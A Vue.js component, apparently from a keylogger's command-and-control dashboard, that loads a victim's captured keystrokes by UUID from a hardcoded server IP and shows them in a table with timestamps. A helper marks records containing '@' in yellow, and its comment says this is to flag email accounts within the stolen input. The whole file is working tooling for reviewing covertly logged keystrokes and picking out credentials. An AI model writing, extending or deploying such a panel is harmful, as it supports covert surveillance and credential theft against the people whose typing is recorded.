<template>
  <div>
<!--    <p>BeaconDetails的VUE组件</p>-->
<!--      {{records}}-->
    <table>
      <caption>
        <h3>{{userID}}</h3>
      </caption>
      <thead>
        <tr>
          <th>按键记录</th>
          <th>记录时间</th>
        </tr>
      </thead>
      <tr v-for="record in records" :key="record.Timestamp" :id="record.Timestamp">
        <td @mouseover="judgingData(record)">{{record.KeystrokeRecord}}</td>
<!--        <td>{{record.KeystrokeRecord}}</td>-->
<!--        <td>{{judgingData(record)}}</td>-->
        <td>{{getDate(record.Timestamp)}}</td>
      </tr>
    </table>
  </div>
</template>

<script>
import axios from "axios";

var containEmails = [];

export default {
  name: "BeaconDetails",
  computed:{
    userID() {
      return this.$route.params.uuid
    },
    // containEmails(){
    //   return []
    // }
  },
  data(){
    return{
      records: null,
      // containEmails: []
    }
  },
  watch:{
    userID: function (){
      // axios.get("http://localhost:4435/v1/"+this.userID)
      axios.get("http://42.193.116.23:4435/v1/"+this.userID)
          .then(response => {
            // console.log(response.data)
            this.records = response.data;
          });
    },
    containEmails: function (){
      for (let i in containEmails) {
        console.log("Traverse containEmails")
        document.getElementById(i).childNodes[0].bgColor = "yellow"
      }
    }
  },
  created() {
    // axios.get("http://localhost:4435/v1/"+this.userID)
    axios.get("http://42.193.116.23:4435/v1/"+this.userID)
        .then(response => {
          // console.log(response.data)
          this.records = response.data;
        });
  },
  methods: {
    getDate(timestamp) {
      const realTimestamp = timestamp * 1000;
      const date = new Date(realTimestamp);
      const Y = date.getFullYear() + '-';
      const M = (date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date.getMonth() + 1) + '-';
      const D = date.getDate() + ' ';
      const h = date.getHours() + ':';
      const m = date.getMinutes() + ':';
      const s = date.getSeconds();
      return Y + M + D + h + m + s
    },
    judgingData(data) {
      // var pattern = /\][a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+\[/
      var keyrecord = data.KeystrokeRecord
      // console.log(data.Timestamp)
      // if (pattern.test(keyrecord)){
      if (keyrecord.indexOf("@")!=-1){
        //判断是否存在邮箱账号
        document.getElementById(data.Timestamp).childNodes[0].bgColor = "yellow"
        // this.containEmails.push(1)
        // containEmails.push(data.Timestamp)
        // console.log(containEmails)
      }
    },
  }
}


</script>

<style scoped>
table
{
  border-collapse: collapse;
  margin: 0 auto;
  text-align: center;
  width: 70%;
}
table td, table th
{
  border: 1px solid #cad9ea;
  color: #666;
  height: 30px;
}
table thead th
{
  background-color: #CCE8EB;
}
table tr:nth-child(odd)
{
  background: #fff;
}
table tr:nth-child(even)
{
  background: #F5FAFA;
}
</style>